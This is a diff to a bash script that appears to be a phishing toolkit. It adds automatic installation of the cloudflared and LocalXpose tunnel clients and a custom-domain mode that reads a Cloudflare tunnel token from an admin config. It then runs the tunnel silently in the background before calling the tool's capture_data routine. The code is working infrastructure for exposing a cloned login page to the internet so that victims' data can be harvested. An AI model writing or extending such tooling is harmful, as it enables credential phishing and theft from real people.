@@ -442,6 +442,7 @@ capture_data() {
 
 ## Start Cloudflared
 start_cloudflared() { 
+	install_cloudflared
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
@@ -479,6 +480,7 @@ localxpose_auth() {
 
 ## Start LocalXpose (Again...)
 start_loclx() {
+	install_localxpose
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
@@ -513,16 +515,32 @@ start_localhost() {
 start_custom_domain() {
 	if [[ -f "admin/config.json" ]]; then
 		domain=$(grep -o '"domain":"[^"]*' admin/config.json | cut -d'"' -f4)
+		conn_type=$(grep -o '"conn_type":"[^"]*' admin/config.json | cut -d'"' -f4)
+		tunnel_token=$(grep -o '"tunnel_token":"[^"]*' admin/config.json | cut -d'"' -f4)
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} No domain configured in Admin Panel!"
 		read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Domain manually (e.g. example.com): ${BLUE}" domain
+		conn_type="direct"
 	fi
 	
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Point your domain ${CYAN}$domain${GREEN} to this server."
-	echo -e "${ORANGE} Hint: Use a tunnel like 'ssh -R 80:localhost:$PORT $domain@ssh.localhost.run' if on Termux."
+	
+	if [[ "$conn_type" == "tunnel" && -n "$tunnel_token" ]]; then
+		install_cloudflared
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Connecting via Cloudflare Tunnel..."
+		echo -e "${CYAN} Domain: $domain"
+		if [[ `command -v termux-chroot` ]]; then
+			sleep 2 && termux-chroot ./.server/cloudflared tunnel run --token "$tunnel_token" > /dev/null 2>&1 &
+		else
+			sleep 2 && ./.server/cloudflared tunnel run --token "$tunnel_token" > /dev/null 2>&1 &
+		fi
+	else
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Direct Connection Mode"
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Point your domain ${CYAN}$domain${GREEN} to this server."
+		echo -e "${ORANGE} Hint: Use a tunnel like 'ssh -R 80:localhost:$PORT $domain@ssh.localhost.run' if on Termux."
+	fi
 	capture_data
 }
 
